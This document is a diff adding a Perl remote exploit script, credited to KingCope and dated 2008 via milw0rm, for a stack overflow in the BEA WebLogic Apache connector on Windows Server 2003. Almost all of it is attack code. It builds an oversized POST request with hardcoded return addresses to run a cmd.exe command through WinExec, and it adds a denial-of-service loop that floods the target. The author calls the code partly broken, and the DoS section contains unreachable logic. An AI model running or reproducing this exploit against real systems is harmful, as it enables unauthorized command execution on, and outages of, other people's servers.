@@ -1,0 +1,134 @@
+#// Bea Weblogic -- Apache Connector Remote Exploit +-1day
+#// Should stack break latest Windows Server 2003 <address space randomization>
+#// BIG THANKS TO 
+#// "dong-hun you"(Xpl017Elz) in INetCop - for his paper
+#// "Title: Advanced exploitation in exec-shield (Fedora Core case study)"
+#// His technique works fine against Windows 2003 latest version.
+#//
+#// The code is broken, since I am chilling out for now
+#// SKIDDI BULLETPROOF
+#// You may fixup the DoS Code, Windows Code Works on English OSs
+#// KingCope -- July/2008
+
+use IO::Socket;
+use strict;
+
+$|=1;
+my $apacheport = 80;	#// Touch
+###
+my $wrongusage = 0;
+my $dodoshost = 0;
+
+###############################################################################
+### Target List Entries |Operating System and Patch Level / Kernel Version|
+###############################################################################
+my @targets = ();
+my @tgtname = ();
+print "-" x 80;
+$targets[0] = "1 Windows Server 2003 Enterprise Edition SP2 RC1 -- English\n";
+$tgtname[0] = $targets[0];
+$targets[100] = "2 Denial of Service\n";
+$tgtname[100] = $targets[100];
+
+###############################################################################
+### Print Of Target List And Usage
+###############################################################################
+print "\n";
+
+print "Bea Weblogic -- Apache Connector Remote Exploit\n\n";
+print "Target List:\n";
+
+foreach my $target (@targets) {	
+	print $target;
+}
+print "\n\n";
+print "-" x 80;
+print "Usage: perl bea-unlock.pl <hostname or ip> <target>";
+print "\n";
+
+printusage:
+if ($wrongusage == 1) {	exit; }
+
+################################################################################
+### Argument Parsing
+################################################################################
+my $host = $ARGV[0];
+my $target = $ARGV[1];
+
+if (($host == "") || ($target == "")) {
+	$wrongusage = 1;
+	goto printusage;
+}
+
+################################################################################
+### Setup Socket
+################################################################################
+setupsocket:
+my $sock = IO::Socket::INET->new(PeerAddr => $host,
+                           	     PeerPort => $apacheport,
+   	                             Proto    => 'tcp');
+if ($dodoshost == 1) {
+	goto doshost;	
+}
+################################################################################
+### Select Target
+################################################################################
+if ($target == 1) {
+	print "Exploiting $host -- " . $tgtname[$target-1];
+	goto winexpl;
+}
+
+if ($target == 2) {
+    print "Attacking Host $host -- Denial of Service -- Wait ...\n";
+	goto doshost;
+}
+
+################################################################################
+### Exploitation of Windows Versions
+################################################################################
+winexpl:
+####WORKS [LOOKUP THE HOSTNAME]
+my $command = "echo works > c:\\desiredfile.txt";
+			 
+my $cmds = "cmd.exe /c \"$command\"|";
+
+my $sc = $cmds;
+
+#### STACKBREAKING WITH WINEXEC() ON WINDOWS
+
+my $c = "C" x 97 . pack("L", 0x10013930) x 3 . pack("L", 0x10013930) . pack("L", 0x10013931) . pack("L",0x77EA411E);
+my $a = $cmds . "A" x (4000-length($cmds)) . $c;
+
+print $sock "POST /.jsp $a\r\nHost: localhost\r\n\r\n";
+
+while (<$sock>) {	
+	print;
+}
+################################################################################
+### Denial of Service Against The Apache Frontend Module For Bea Weblogic
+################################################################################
+####NEEDS SOME FIXUP
+doshost:
+$dodoshost = 1;
+
+while(1) {
+	$a = "A" x 6000;
+	goto setupsocket;
+	print $sock "POST /.jsp $a\r\n\r\nHost: localhost\r\n\r\n";
+	while(read($sock,$_,100)) {
+		my $dosagain = 0;
+		
+		if ($dosagain eq 1) {
+				"Server is down now\n";
+				exit;
+		}
+		
+		if ($_ =~ /Server/) {
+			print ".";
+			$dosagain = 1;
+			next;
+		}
+	}
+}
+
+# milw0rm.com [2008-07-17]
